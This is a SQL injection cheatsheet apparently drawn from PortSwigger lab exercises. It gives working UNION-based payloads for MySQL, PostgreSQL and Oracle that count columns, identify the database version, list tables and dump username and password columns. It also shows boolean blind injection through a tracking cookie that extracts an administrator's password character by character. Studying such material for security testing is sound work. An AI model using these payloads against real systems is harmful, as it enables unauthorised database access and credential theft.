# SQL Injection Cheatsheets
- Labs from portswigger labs
## SQL Database
> Here are commands to find MySQL, Microsoft SQL server [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![SQL Database Structure](https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Images/SQL_db.png)
- Identifying number of columns available in SQL database to craft the union select command 
```bash
# Pets is the parameter in the URL 
Pets' order by 1#  # Increase the number starting from 1 to so on, when ever you get the 500 error then n-1 columns are their
Pets' order by 3#    # Error 500 internal server error decided with go for 2 columns in this case
Pets' order by 2#     # No error 200 OK
Pets'union select null, null#
```
- Identifying Version of SQL database
```bash
Pets'union select @@version, null#      # Microsoft SQL, MySQL
Pets'union select version(), null#      # PostgreSQL
```
- List of Tables from the Oracle database
```bash
Pets'union select table_name, null from information_schema.tables--      # or you can use # instead of --
```
- Extract Data in tables
```bash
Pets'union select column_name, null from information_schema.columns where table_name = 'users_xacgsm'--    # List of columns
Pets'union select username_pxqwui, password_bfvoxs from users_xacgsm--
Pets'union select username_pxqwui ||'~'|| password_bfvoxs, null from users_xacgsm--  # Printing username and password one cloumn with '~' sign in between
```

## ORACLE Database
> Here are commands to find ORACLE DB [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Oracle Database Structure](https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Images/Oracle_db.png)
- Identifying number of columns available in Oracle database to craft the union select command 
```bash
# Pets is the parameter in the URL 
Pets' order by 1--    # Increase the number starting from 1 to so on, when ever you get the 500 error then n-1 columns are their
Pets' order by 3--    # Error 500 internal server error decided with go for 2 columns in this case
# Asume here 2 columns, when I use the number 3 error of 500 internal server error
Pets' order by 2--     # No error 200 OK
Pets'union select null, null from DUAL--     # DUALinternal table in ORACLE
Pets'union select 'a', 'a' from DUAL--
```
- Identifying Version of Oracle database
```bash
Pets'union select null, banner from v$version--
```
- List of Tables from the Oracle database
```bash
' union select table_name from all_tables--  # It will provide the table names check for user keywords
```
- Extract Data in tables
```bash
Pets'union select column_name null from+all_tab_columns where table_name = 'USERS_BPAWFN'--    # List of columns
Pets'union select USERNAME_RABKTC,PASSWORD_YOEYVJ from+USERS_BPAWFN--
```

## SQL injection UNION attacks

> when an application is vulnerable to SQL injection, and the results of the query are returned within the application's response, you can use the ```UNION``` keyword to retrive data from other tables within the database. This is commonly know as a SQL injection UNION attack.

- The ```UNION``` keyword enables you to execute one or more additional ```SELECT``` queries and append the results to the original query. For example:
```bash
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
- This SQL query returns a single result set with two columns, containing values from columns ```a``` and ```b``` in ```table1``` and columns ```c``` and ```d``` in ```table2```.
- For a ```UNION``` query to work, two key requirements must be met:
    - The individual queries must return the same number of columns.
    - The data types in each column must be compatible between the individual queries.
- To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
    - How many columns are being returned from the original query.
    - Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

##### Determining the number of columns required
- When trying the SQL ```UNION``` injection their are 2 ways
- One method
    - ' ORDER BY 1--
- The second method
    - ' UNION SELECT NULL--
- You need to increase the number in order and null value in ```UNION SELECT``` command, until you get an error in the output page.
```bash
# One method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
# The second method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
- When using the ```ORDER BY``` technique, the application may return a database error, a generic error, or no results. If the number of nulls matches the columns, the database adds a row with null values. This may result in extra content in the response, such as an additional row in an HTML table. Alternatively, it could trigger errors like ```NullPointerException```, or the response may appear unchanged, rendering this method ineffective.

##### Database-specific syntax ORACLE DB
- On Oracle, every ```SELECT``` query must use the ```FROM``` keyword and specify a valid table. There is a build-in table on Oracle called ```dual``` which can used for this purpose. So the injected queries on Oracle would need to look like:
```bash
' UNION SELECT null FROM DUAL--
```

##### Finding columns with a useful data type
- First, determine the number of columns then
- Second, Then find which columns hold the ```string``` by changing the values
```bash
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

##### Using a SQL injection UNION attack to retrieve interesting data
- when you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
- Suppose that:
    - The original query returns two columns, both of which can hold string data.
    - The injection point is a quoted string within the WHERE clause.
    - The database contains a table called users with the columns username and password.
- In this example, you can retrieve the contents of the ```users``` table by submitting the input:
```bash
' UNION SELECT username, password FROM users--
```
##### Retrieving multiple values within a single column
- You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
```bash
' UNION SELECT username || '~' || password FROM users--
# Results may like: administrator~s3cure
```

## Blind SQL injection
- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors
- Many techniques such as ```UNION``` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

##### Exploiting blind SQL injection by triggering conditional responses
- Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
```bash
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
- When a request containing a ```TrackingId``` cookie is processed, the application uses a SQL query to determine whether this is a known user:
```bash
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
- This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized ```TrackingId```, the query returns data and you receive a "Welcome back" message in the response.
- This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
- To understand how this exploit works, suppose that two requests are sent containing the following  cookie ```TrackingId```  values in turn:
```bash
…xyz' AND '1'='1
…xyz' AND '1'='2
```
- Two conditions
    - The first of these values causes the query to return results, because the injected AND ```'1'='1``` condition is true. As a result, the "Welcome back" message is displayed.
    - The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
- This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
-  For example, suppose there is a table called ```Users``` with the columns ```Username``` and ```Password```, and a user called ```Administrator```. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
- This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
- Next, we send the following input:
```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
- So on change the values based on the ```m, t and s``` soon.
- Script to retrive the password [video](https://www.youtube.com/watch?v=5brORHQSJMc) , [script](https://raw.githubusercontent.com/ashok5141/Application-Security-Cheatsheet/refs/heads/main/Scripts/SQL_Blind_Password_Retrive.py)
```bash
# Burp Suite(Repeater) Lab this case TrackingID vulnerable
#  True - welcome back
# False - No welcome back not existed your requesting for.
scliTLUSpsZWWON5                  # Response 200 OK
scliTLUSpsZWWON5' AND '1'='1      # Response 200 OK
scliTLUSpsZWWON5'+AND+1%3d1--     # Encode the payload(' AND 1=1--), Response 200 OK, This case ' or  1=2--  # Saying 200 OK because tracking id is correct.
scliTLUSpsZWWON5' and (select 'x' from users LIMIT 1)='x'--'    # Response 200 OK,  It returns welcome back message users table exits
scliTLUSpsZWWON5' and (select username from users where username='administrator'  LIMIT 1)='administrator'--'    # 200 OK, Administrator is available in the table
scliTLUSpsZWWON5' and (select password from users where username='administrator'  LIMIT 1)='Welcome2021!'--'     # IT's really trying brute forcing
scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--';    # Password more then 1 character
scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'   #  Brute force this 1 to 50 it will return the 20, 19 we are getting welcome back message
scliTLUSpsZWWON5' and (select substring(password,1,1) from users where username='administrator')='a'--'   # trying password string with 'a'
# Either use Burp Professional or python above script
```
